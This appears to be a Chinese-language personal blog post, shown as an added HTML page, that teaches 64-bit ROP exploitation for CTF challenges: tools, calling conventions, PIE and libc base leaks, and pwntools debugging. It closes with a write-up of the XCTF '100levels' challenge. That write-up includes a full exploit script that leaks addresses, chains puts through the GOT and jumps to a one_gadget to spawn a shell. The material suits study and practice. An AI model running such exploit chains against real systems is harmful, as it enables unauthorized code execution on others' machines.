@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="hustcw">
+
+
+
+<meta name="description" content="写在前面 这个博文应该会持续更新，把看到的64rop有意思的地方都写进来。以及把64位程序的一些相关知识记录一下。真实感受是，pwn技巧要能有长进的话学习是一方面，但是学习的时候别人不会面面俱到，很多细节自己没有掌握。但是有了ida有了gdb，配合各种工具应该自己多摸索。">
+<meta name="keywords" content="ctf,ida,rop">
+<meta property="og:type" content="article">
+<meta property="og:title" content="64位ROP练习">
+<meta property="og:url" content="https://hustcw.github.io/2019/03/17/64位ROP练习/index.html">
+<meta property="og:site_name" content="Hustcw">
+<meta property="og:description" content="写在前面 这个博文应该会持续更新，把看到的64rop有意思的地方都写进来。以及把64位程序的一些相关知识记录一下。真实感受是，pwn技巧要能有长进的话学习是一方面，但是学习的时候别人不会面面俱到，很多细节自己没有掌握。但是有了ida有了gdb，配合各种工具应该自己多摸索。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://hustcw.github.io/assets/img/rop/64.png">
+<meta property="og:image" content="https://hustcw.github.io/assets/img/rop/load.png">
+<meta property="og:image" content="https://hustcw.github.io/assets/img/100/leak">
+<meta property="og:image" content="https://hustcw.github.io/assets/img/100/flag">
+<meta property="og:updated_time" content="2019-09-23T18:38:52.260Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="64位ROP练习">
+<meta name="twitter:description" content="写在前面 这个博文应该会持续更新，把看到的64rop有意思的地方都写进来。以及把64位程序的一些相关知识记录一下。真实感受是，pwn技巧要能有长进的话学习是一方面，但是学习的时候别人不会面面俱到，很多细节自己没有掌握。但是有了ida有了gdb，配合各种工具应该自己多摸索。">
+<meta name="twitter:image" content="https://hustcw.github.io/assets/img/rop/64.png">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Hustcw" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favico.png">
+
+
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>64位ROP练习 | Hustcw</title>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.4.0/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/assets/img/MyAvatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">hustcw</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/Hustcw" title="GitHub"></a>
+                            
+                                <a class="fa Email" href="mailto:hustcw1998@gmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/angr/">angr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/formatstr/">formatstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/">glibc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac/">mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/machine-learning/">machine learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/off-by-one/">off-by-one</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/plan/">plan</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rop/">rop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/study/">study</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zip/">zip</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">hustcw</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/assets/img/MyAvatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">hustcw</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Hustcw" title="GitHub"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:hustcw1998@gmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-64位ROP练习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/17/64位ROP练习/" class="article-date">
+      <time datetime="2019-03-17T03:46:14.000Z" itemprop="datePublished">2019-03-17</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      64位ROP练习
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ida/">ida</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rop/">rop</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2><span id="写在前面">写在前面</span></h2><blockquote>
+<p>这个博文应该会持续更新，把看到的64rop有意思的地方都写进来。以及把64位程序的一些相关知识记录一下。真实感受是，pwn技巧要能有长进的话学习是一方面，但是学习的时候别人不会面面俱到，很多细节自己没有掌握。但是有了ida有了gdb，配合各种工具应该自己多摸索。</p>
+</blockquote>
+<a id="more"></a>
+<h2><span id="工具">工具</span></h2><ul>
+<li>IDA pro</li>
+<li>Pwndbg (gdb插件，高亮调试)</li>
+<li>Onegadget (在libc中找到shellcode的偏移)</li>
+<li>ROPgadget (在程序中找到特定的gadget)</li>
+<li>libc-database (根据泄露的函数地址的后12位找到libc版本)</li>
+</ul>
+<h2><span id="基本知识">基本知识</span></h2><p>64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同：<br><img src="/assets/img/rop/64.png" alt="64位寄存器"></p>
+<h3><span id="和函数栈有关的指令解释">和函数栈有关的指令解释</span></h3><p>leave等价于<code>mov rsp, rbp ;pop rbp;</code> (注意，pop rbp后，rsp会自动忘高地址移动一个指针，所以再ret就会pop retaddr)<br>retn等价于<code>pop rip</code>; (这里n是near的意思，指不pop cs) 然后执行rip指向的那条指令<br>retf等价于<code>pop rip; pop rcs</code></p>
+<p><strong>可以发现不管是leave还是ret都不会再次调整rsp了，因为一般函数的开头都会执行</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp, rsp</span><br><span class="line">sub rsp, Constant</span><br></pre></td></tr></table></figure></p>
+<h2><span id="一般分析的思路">一般分析的思路</span></h2><p><strong>leak info –&gt; get function addr –&gt; get libc base –&gt; get shell</strong></p>
+<p>rop的题有时给libc有时又不给，其实这个差别现在来看并不大, 即使开启了PIE也可以用libc-database找libc版本。分析题目，如果没有开启PIE，那方便，只要有溢出直接rop。如果开了canary，那得根据情况分析。开了PIE，这时候第一步是leak info，必须得有地方去rop，盲打不现实。leak info的时候就充分利用按段加载的特性和最低12位不变的特性来做，但是要注意栈每次加载还是会有变化，即使是最低12位也会不同。通过泄露地址来配合ropgadgets使用，要泄露出程序加载的地址才有用。另外就是看利用read和printf和puts看能不能想办法泄露libc基地址，给了libc加基地址就能够rop到libc里了，配合onegadget已经可以getshell了。如果没有给libc版本就在使用libc-database查找就好。此外还有GOT表可不可以被劫持的问题，如果开了full RELRO的话，GOT是不可以写的。最后落实到写exploit上，使用pwntools时可以把已知的信息放到最开始的变量里，需要泄露的信息中间再写。</p>
+<h2><span id="offset的说明">offset的说明</span></h2><p>已知在64位的情况下经常会开启PIE，地址随机的情况下最低的12位是固定的，而且64位机器上最高两个字节都是0，而第三位一般是0x55。</p>
+<ul>
+<li>ROPgadget给出的地址是相对于程序加载地址的偏移地址，即使开了PIE，leak出加载的基地址后gadgets也是可以用的</li>
+<li>onegadget给出的是相对于libc基地址的偏移地址</li>
+<li>pwntools给出的got，plt信息是相对于程序加载地址的偏移(开了PIE也是)</li>
+</ul>
+<p>程序加载的基地址之前还一直不知道在哪，自己调出来的：<br><img src="/assets/img/rop/load.png" alt="程序加载基地址"></p>
+<h2><span id="找地址的方法">找地址的方法</span></h2><p>以前喜欢用gdb打断点慢慢调，但是因为静态分析的时候就是用的ida，如果不是用到堆相关的东西，动态调试还是继续用ida吧，打断点到关键代码然后看栈和代码段的信息，因为可以配合伪代码看，还挺方便的。但是有的时候ida给的伪代码有时候识别不出来变量的真实情况，<strong>比如有时候就看不出来这个变量是在栈上的，需要慢慢看汇编</strong>。view里的open subview来找各个段很方便。</p>
+<h2><span id="pwntools配合gdb调试">pwntools配合gdb调试</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line">p = process(<span class="string">'./xxxx'</span>)</span><br><span class="line"> </span><br><span class="line">payload = .....</span><br><span class="line">pwnlib.gdb.attach(p)</span><br><span class="line">pause() <span class="comment"># gdb里打断点</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>ps:<br>还可以使用其他xterm，tmux等其他终端，如果脚本运行在tmux中，可以这样指定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-v&apos;]</span><br></pre></td></tr></table></figure></p>
+<p>这两种可以让gdb运行在横向或者纵向分割出来的tmux窗口中。</p>
+<p>另外，也可以在attach的时候指定gdb脚本，这样可以断在自己想的地方。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(proc.pidof(s)[<span class="number">0</span>], execute=<span class="string">'b *0x400620\nc\n'</span>)</span><br></pre></td></tr></table></figure></p>
+<h2><span id="pwntools配合ida调试">pwntools配合IDA调试</span></h2><p>用socat把程序挂在虚拟机的固定端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:端口号,reusseaddr,fork <span class="built_in">exec</span>:程序位置</span><br><span class="line">socat tcp-listen:10001,reuseaddr,fork EXEC:./heapTest_x86,pty,raw,<span class="built_in">echo</span>=0 <span class="comment">#例子</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>这时候可以选择host或者虚拟机里打开python用pwntools的remote连上程序了(仅仅使用remote)</li>
+<li>返回ida选择attach to process，刚开始可以打好断点按f9跳过.最后就是使用ipython里的pwntools开心的调试了</li>
+<li>不用ipython的话配合pause使用更佳</li>
+</ul>
+<h2><span id="实战">实战</span></h2><h3><span id="xctf100levels">XCTF——100levels</span></h3><p>题目给了libc，拿到程序看一下开了什么保护：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
+<p>开了PIE的题目，第一步就是leak info，找到栈上有一个变量被printf函数调用并且没做检查，突破口找到。如果能把这个栈地址上放一个.text的地址，通过printf可以泄露一部分信息。有意思的是只让泄露4个字节，高2字节为0，低一个半字节确定的情况下，需要爆破4个半字节。<br><img src="/assets/img/100/leak" alt="leak"><br>又考虑到代码段加载通常高第三个字节为0x55或者0x56，因此可以考虑让rbp的偏移刚好为泄露从低位开始的第2，3，4，5字节，代码段的地址就被泄露出来了。已知这个地址就可以开始rop了，通过rop一个puts的<strong>libc_start_main的got表调用，返回地址设置成main函数地址。libc及地址也就有了。再用一下onegadget大功告成。写一个脚本暴力枚举一下，按理来说有3%多的概率让rbp-0x34撞到rip.<br><img src="/assets/img/100/flag" alt="flag"><br><strong>总结</strong><br>这题需要partial-write栈基栈泄露地址来绕过PIE.利用情况即为栈上某一变量可被泄露时，通过栈溢出rop分别泄露加载地址和libc基地址。这里泄露libc式的rop找的太轻松了，也是一种套路吧，puts调用</strong><a href="mailto:libc_start_main@got.plt" target="_blank" rel="noopener">libc_start_main@got.plt</a>.细节上要注意的是动态调试的时候多用pause断下来，判断好exploit写对了没。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(x))</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(y))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./100levels'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh = process(<span class="string">'./100levels'</span>)</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    run(<span class="number">100</span>,<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Question:"</span>)</span><br><span class="line">    q = sh.recvuntil(<span class="string">"="</span>)[:<span class="number">-1</span>]</span><br><span class="line">    ans =  eval(q.strip())</span><br><span class="line">    sh.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.send(str(ans).ljust(<span class="number">0x30</span>, <span class="string">'\x00'</span>) +<span class="string">'\xcd'</span>)</span><br><span class="line">        <span class="comment"># leak addr</span></span><br><span class="line">        sh.recvuntil(<span class="string">'Level '</span>)</span><br><span class="line">        medium = sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">        medium = int(medium)</span><br><span class="line">        <span class="keyword">if</span> medium &lt; <span class="number">0</span>:</span><br><span class="line">            medium = <span class="number">0x100000000</span> + medium</span><br><span class="line">        medium = hex(medium)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">print</span> medium</span><br><span class="line">        <span class="keyword">if</span> len(medium)&lt;<span class="number">8</span>:</span><br><span class="line">            medium = medium.rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">        real_addr = <span class="string">'000055'</span>+ medium +<span class="string">'8b'</span></span><br><span class="line">        <span class="keyword">print</span> real_addr</span><br><span class="line">        <span class="comment"># make stack arguments</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sent successfully!'</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    code_base = int(real_addr,<span class="number">16</span>) - <span class="number">3723</span></span><br><span class="line">    pop_rdi = code_base+<span class="number">0x1033</span></span><br><span class="line">    __libc_start_main_addr_got = code_base + elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">    puts_plt = code_base + elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    main_addr = code_base + <span class="number">3911</span></span><br><span class="line">    sh.send(<span class="string">'a'</span>*<span class="number">56</span>+p64(pop_rdi)+p64(__libc_start_main_addr_got)+p64(puts_plt)+p64(main_addr))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc_addr = u64(sh.recv() + <span class="string">'\x00\x00'</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'solved!!\n'</span></span><br><span class="line">    one_gadget = - libc.symbols[<span class="string">'__libc_start_main'</span>] + <span class="number">0x4526a</span> + libc_addr</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    run(<span class="number">100</span>,<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"Question:"</span>)</span><br><span class="line">    q = sh.recvuntil(<span class="string">"="</span>)[:<span class="number">-1</span>]</span><br><span class="line">    ans =  eval(q.strip())</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.send(str(ans).ljust(<span class="number">0x38</span>, <span class="string">'\x00'</span>) +p64(one_gadget))</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/03/17/64位ROP练习/">64位ROP练习</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">hustcw</a></p>
+        <p><span>发布时间:</span>2019-03-17, 11:46:14</p>
+        <p><span>最后更新:</span>2019-09-24, 02:38:52</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/03/17/64位ROP练习/" title="64位ROP练习">https://hustcw.github.io/2019/03/17/64位ROP练习/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hustcw.github.io/2019/03/17/64位ROP练习/　　作者: hustcw" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/03/19/二进制的一些基本操作/">
+                    准备pwn环境的一些基本操作
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/03/16/zip的选择明文攻击/">
+                    zip的选择明文攻击
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.</span> <span class="toc-text">基本知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">3.1.</span> <span class="toc-text">和函数栈有关的指令解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">4.</span> <span class="toc-text">一般分析的思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">5.</span> <span class="toc-text">offset的说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">6.</span> <span class="toc-text">找地址的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">7.</span> <span class="toc-text">pwntools配合gdb调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">8.</span> <span class="toc-text">pwntools配合IDA调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">9.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">9.1.</span> <span class="toc-text">XCTF——100levels</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"64位ROP练习　| Hustcw　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+<!-- 添加打赏功能 -->
+
+
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/03/19/二进制的一些基本操作/" title="上一篇: 准备pwn环境的一些基本操作">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/03/16/zip的选择明文攻击/" title="下一篇: zip的选择明文攻击">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
